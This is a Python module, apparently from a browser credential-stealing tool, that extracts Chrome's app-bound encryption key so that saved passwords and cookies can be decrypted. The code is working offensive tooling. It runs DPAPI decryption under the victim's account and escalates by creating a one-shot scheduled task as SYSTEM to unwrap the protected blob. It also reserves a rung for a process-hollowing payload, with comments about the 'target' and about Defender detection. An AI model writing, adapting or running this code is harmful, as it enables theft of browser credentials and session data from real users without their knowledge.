"""App-bound key extraction in three rungs, cheapest first.

Chrome 127 added an application-identity check: the app-bound key is wrapped in a blob that
only SYSTEM can open, and Chrome asks a privileged service to unwrap it. That service
verifies the caller is really Chrome before it answers, so plain DPAPI stopped working for
``v20`` rows and stayed working for everything older.

Three ways in, and this module dispatches all three:

``user``
    DPAPI inside the current process. Touches nothing outside it and leaves no trace. Works
    on every Chromium fork with no app-bound wrap at all — Brave reports none — and on Chrome
    before 127. Tried first because a run that can finish here should: the other two cost the
    target something.
``hollow``
    A browser process spawned suspended with its image replaced, so the elevation service
    sees a caller it will accept. **The payload is deliberately not shipped** — see
    ``DECISIONS.md``. The rung exists so the ordering and the record are complete, and so a
    payload tested elsewhere has a slot with a defined contract.
``system``
    A one-shot scheduled task runs this same executable as SYSTEM with
    ``--abe-unwrap <workspace>``, which unwraps ``in.bin`` under SYSTEM and writes hex to
    ``out.hex``. Works on a current Chrome and leaves a task-creation event every run.

The result carries which rung produced the key — the report calls it ``abe_path`` — and one
line per rung that did not, because "no key" is several different facts and only some of them
are faults.

The SYSTEM rung's sequence, and the reason for each step:

1. ``app_bound_encrypted_key`` is base64 with a 4-byte ``APPB`` prefix. Strip it.
   The remainder is a DPAPI blob wrapped under SYSTEM.
2. A scheduled task registered ``/ru SYSTEM /rl HIGHEST`` runs this same executable
   with ``--abe-unwrap <workspace>``. It unwraps ``in.bin`` under SYSTEM and writes
   hex to ``out.hex``. One path, not two: schtasks caps ``/tr`` at 261 characters and
   two absolute paths under ``%TEMP%`` overflow it in a development tree.
3. That plaintext is usually itself a DPAPI blob wrapped under the current user:
   ``DPAPI`` prefix, strip 5, unwrap in-process to the 32-byte key.
4. Some Chrome builds hand back the 32 bytes with no prefix at all. That is version
   drift, not corruption, and it is used as-is. No length guessing beyond exactly 32.
"""

from __future__ import annotations

import hashlib
import os
import secrets
import shutil
import sys
import tempfile
import time
from collections.abc import Callable
from pathlib import Path
from typing import Final, NamedTuple

from . import loader, log, util, winapi

UNWRAP_FLAG: Final[str] = "--abe-unwrap"

RUNG_USER: Final[str] = "user"
RUNG_HOLLOW: Final[str] = "hollow"
RUNG_SYSTEM: Final[str] = "system"

# Cheapest first, measured in what the target has to give up: ``user`` opens a handle to
# nothing and writes nothing, ``hollow`` spawns a browser and can crash it, ``system`` logs a
# task creation. A run that can finish on the cheapest rung must, so the order is by cost to
# the target and not by the order the rungs were invented in.
RUNGS: Final[tuple[str, ...]] = (RUNG_USER, RUNG_HOLLOW, RUNG_SYSTEM)

# Written beside ``state.json`` and ``session_status.json`` so one directory answers "what
# did this run manage to do". **The key never goes in it**: a record that says how is
# intelligence, a record that says what is a credential in a text file.
RECORD_FILE: Final[str] = "abe.json"

_APP_BOUND_PREFIX: Final[bytes] = b"APPB"
_DPAPI_PREFIX: Final[bytes] = b"DPAPI"
_KEY_BYTES: Final[int] = 32

# The DPAPI blob magic. Current Chrome hands back the user-scoped blob with no
# ``DPAPI`` text prefix at all, so the magic is the only marker that says "unwrap
# this again under the current user". Measured on metal: 384 bytes, ``01 00 00 00 d0``.
_DPAPI_MAGIC: Final[bytes] = bytes.fromhex("01000000d08c9ddf0115d1118c7a00c04fc297eb")

_SOURCE_NAME: Final[str] = "in.bin"
_RESULT_NAME: Final[str] = "out.hex"

_TASK_PREFIX: Final[str] = "SABLE-ABE-"
_RESULT_TIMEOUT: Final[float] = 60.0
_POLL_INTERVAL: Final[float] = 0.2
_SCHTASKS_TIMEOUT: Final[float] = 30.0
_MAX_HELPER_BLOB: Final[int] = 1024 * 1024

# Absolute, for the same reason ``util._schtasks`` is: a bare name is resolved off PATH,
# and a task registered from a hijacked PATH entry runs somebody else's binary.
_SYSTEM32: Final[Path] = Path(os.environ.get("SYSTEMROOT") or r"C:\Windows") / "System32"

# schtasks refuses a /tr value longer than this. Measured on metal: a dev-mode
# command line of 300 characters fails with "Value for '/tr' option cannot be more
# than 261 character(s)" and the task is never registered. The helper therefore
# takes one directory instead of two file paths, and the workspace name is kept
# short, so the whole line lands near 220 in dev mode and near 150 frozen.
_MAX_COMMAND: Final[int] = 261


def helper_main(args: list[str]) -> int:
    """``args`` is ``entry.main``'s list, still carrying the flag. One path only."""
    rest = [item for item in args if item != UNWRAP_FLAG]
    if len(rest) != 1:
        return 2

    workspace = Path(rest[0])
    source = workspace / _SOURCE_NAME
    destination = workspace / _RESULT_NAME

    try:
        if source.stat().st_size > _MAX_HELPER_BLOB:
            return 3
        blob = source.read_bytes()
    except OSError:
        return 3

    plaintext = winapi.crypt_unprotect(blob)
    if plaintext is None:
        return 4

    try:
        destination.write_text(plaintext.hex(), encoding="ascii")
    except OSError:
        return 5

    # The task is one-shot; the helper removes it on the way out. The caller also
    # deletes it on the failure path, so this is belt and braces, not the only path.
    _delete_task(_task_name(source))
    return 0


class Attempt(NamedTuple):
    """One rung, whether it produced the key, and a line saying what happened."""

    rung: str
    ok: bool
    detail: str


class Unwrap(NamedTuple):
    """The key and how it was obtained. ``path`` is what the report calls ``abe_path``."""

    key: bytes
    path: str
    attempts: tuple[Attempt, ...]


def unwrap(app_bound_blob: bytes) -> Unwrap | None:
    """Try every rung cheapest-first and return the first key, with the trail behind it.

    ``app_bound_blob`` is the base64-decoded value with the ``APPB`` prefix already
    stripped. None means no rung produced a 32-byte key, and the record says why for each.
    """
    if sys.platform != "win32":
        return None
    if not app_bound_blob:
        return None

    attempts: list[Attempt] = []
    for rung in RUNGS:
        key, detail = _RUNNERS[rung](app_bound_blob)
        attempts.append(Attempt(rung, key is not None, detail))
        if key is not None:
            result = Unwrap(key, rung, tuple(attempts))
            _record(result)
            return result

    _record(None, tuple(attempts))
    return None


def _rung_user(blob: bytes) -> tuple[bytes | None, str]:
    """DPAPI in this process. The only rung that costs the target nothing."""
    plaintext = winapi.crypt_unprotect(blob)
    if plaintext is None:
        return None, "the blob is not openable under this user"
    key = _reduce(plaintext)
    if key is None:
        return None, "the blob opened but did not reduce to a 32-byte key"
    return key, "opened under this user, no task and no browser"


def _rung_hollow(_blob: bytes) -> tuple[bytes | None, str]:
    """A suspended browser with its image replaced, and the payload that is not shipped.

    The hollow needs code that resolves its own imports and calls the elevation service from
    inside a process the service will accept. That payload is deliberately absent: the
    reference set names the equivalent binary as the most-detected artifact in the family
    ("highly detected by Defender at this point so a new binary would need to be created
    each time"), and a RunPE that has never been run once on this bench would ship as a
    claim rather than as a build. The rung stays in the ordering so the record is complete
    and so a payload that is tested elsewhere has a slot with a defined contract.
    """
    return None, "skipped: the hollow payload is not shipped (see DECISIONS.md)"


def _rung_system(blob: bytes) -> tuple[bytes | None, str]:
    """One-shot SYSTEM task. Works on a current Chrome; logs a task creation every run."""
    workspace = _workspace()
    source = workspace / _SOURCE_NAME
    result = workspace / _RESULT_NAME
    task = _task_name(workspace)

    try:
        try:
            source.write_bytes(blob)
        except OSError:
            return None, "the workspace is not writable"

        command = _command_line(workspace)
        if len(command) > _MAX_COMMAND:
            # Registering anyway fails inside schtasks with a message about the option
            # rather than about the build, and the run looks like a broken unwrap.
            return None, f"the task command is {len(command)} characters, the cap is {_MAX_COMMAND}"
        if not _register_task(task, command):
            return None, "the task was refused"
        if not _run_task(task):
            return None, "the task was registered but not started"
        plaintext = _await_result(result)
        if plaintext is None:
            return None, "the helper wrote nothing before the deadline"
    finally:
        _delete_task(task)
        shutil.rmtree(workspace, ignore_errors=True)

    key = _reduce(plaintext)
    if key is None:
        return None, f"the SYSTEM plaintext was {len(plaintext)} bytes and reduced to nothing"
    return key, "opened by a one-shot SYSTEM task"


_RUNNERS: Final[dict[str, Callable[[bytes], tuple[bytes | None, str]]]] = {
    RUNG_USER: _rung_user,
    RUNG_HOLLOW: _rung_hollow,
    RUNG_SYSTEM: _rung_system,
}


def _record(result: Unwrap | None, attempts: tuple[Attempt, ...] | None = None) -> None:
    """Write the outcome, attempts included. Never raises, never carries the key."""
    trail = attempts if attempts is not None else (result.attempts if result else ())
    document = {
        "path": result.path if result is not None else None,
        "attempts": [{"rung": a.rung, "ok": a.ok, "detail": a.detail} for a in trail],
    }
    try:
        root = util.queue_root()
        root.mkdir(parents=True, exist_ok=True)
        util.write_json(root / RECORD_FILE, document)
    except Exception:
        # A run that found a key and could not write a note about it is still a run that
        # found a key. Losing the note is a lost observation, not a lost collection.
        log.logger.debug("abe: could not write %s", RECORD_FILE, exc_info=True)



def strip_prefix(value: bytes, prefix: bytes) -> bytes | None:
    """Remove a fixed prefix, or None. Callers must not guess with lengths."""
    if not value.startswith(prefix):
        return None
    return value[len(prefix):]


def _unwrap_key(blob: bytes) -> bytes | None:
    inner = winapi.crypt_unprotect(blob)
    if inner is None or len(inner) != _KEY_BYTES:
        return None
    return inner


def _reduce(plaintext: bytes | None) -> bytes | None:
    if plaintext is None:
        return None

    if plaintext.startswith(_DPAPI_PREFIX):
        return _unwrap_key(plaintext[len(_DPAPI_PREFIX):])

    # Current builds return the user-scoped blob with no text prefix: the SYSTEM
    # unwrap yields a bare DPAPI blob and its magic is the only marker.
    if plaintext.startswith(_DPAPI_MAGIC):
        return _unwrap_key(plaintext)

    # Version drift: some builds return the key with no DPAPI wrapper at all.
    if len(plaintext) == _KEY_BYTES:
        return plaintext

    return None


def _workspace() -> Path:
    """A short directory name. ``s`` plus eight hex characters, under ``%TEMP%``."""
    base = Path(tempfile.gettempdir())
    try:
        workspace = base / f"s{secrets.token_hex(4)}"
        workspace.mkdir()
        return workspace
    except OSError:
        return Path(tempfile.mkdtemp(prefix="s"))


def _task_name(workspace: Path) -> str:
    digest = hashlib.sha1(str(workspace).encode("utf-8", "replace")).hexdigest()[:12]
    return f"{_TASK_PREFIX}{digest}"


def _command_line(workspace: Path) -> str:
    if getattr(sys, "frozen", False):
        launcher = f'"{sys.executable}"'
    else:
        # ``pythonw.exe``, not ``python.exe``. The task action is a console program and
        # a console program started by the scheduler gets a console of its own; the GUI
        # subsystem twin of the same interpreter has no console to show. Measured on a
        # development tree: the task fired, the helper ran, and a black rectangle sat on
        # the desktop for the length of the unwrap.
        executable = Path(sys.executable)
        windowless = executable.with_name("pythonw.exe")
        runner = windowless if windowless.is_file() else executable
        launcher = f'"{runner}" "{Path(sys.argv[0]).resolve()}"'

    # The helper is a fresh process with a fresh command line, so a carrier container has
    # to be named again. Without it the helper's own boot looks for a tail on the
    # executable, which in carrier mode carries none, and the unwrap never starts. The
    # length check in ``unwrap`` is what catches the overflow this can cause; a helper that
    # cannot be described is an unavailable key rather than a broken run.
    carrier = "".join(f' "{item}"' for item in loader.carrier_args())
    return f'{launcher} {UNWRAP_FLAG} "{workspace}"{carrier}'


def _schtasks(arguments: list[str]) -> bool:
    tool = _SYSTEM32 / "schtasks.exe"
    completed = util.run_hidden([tool, *arguments], timeout=_SCHTASKS_TIMEOUT)
    return completed is not None and completed.returncode == 0


def _register_task(task: str, command: str) -> bool:
    # /sc once with a placeholder time is deliberate: the task is never allowed to
    # fire on a schedule, it is started immediately by /run and then deleted.
    return _schtasks(
        [
            "/create",
            "/tn",
            task,
            "/tr",
            command,
            "/sc",
            "once",
            "/st",
            "00:00",
            "/ru",
            "SYSTEM",
            "/rl",
            "HIGHEST",
            "/f",
        ]
    )


def _run_task(task: str) -> bool:
    return _schtasks(["/run", "/tn", task])


def _delete_task(task: str) -> bool:
    return _schtasks(["/delete", "/tn", task, "/f"])


def _await_result(result: Path) -> bytes | None:
    deadline = time.monotonic() + _RESULT_TIMEOUT
    while time.monotonic() < deadline:
        try:
            if result.is_file() and result.stat().st_size > 0:
                text = result.read_text(encoding="ascii", errors="strict").strip()
                if text:
                    return bytes.fromhex(text)
        except (OSError, ValueError):
            # Partially written file or a torn read; try again until the deadline.
            pass
        time.sleep(_POLL_INTERVAL)
    return None


__all__ = [
    "RECORD_FILE",
    "RUNGS",
    "RUNG_HOLLOW",
    "RUNG_SYSTEM",
    "RUNG_USER",
    "UNWRAP_FLAG",
    "Attempt",
    "Unwrap",
    "helper_main",
    "strip_prefix",
    "unwrap",
]
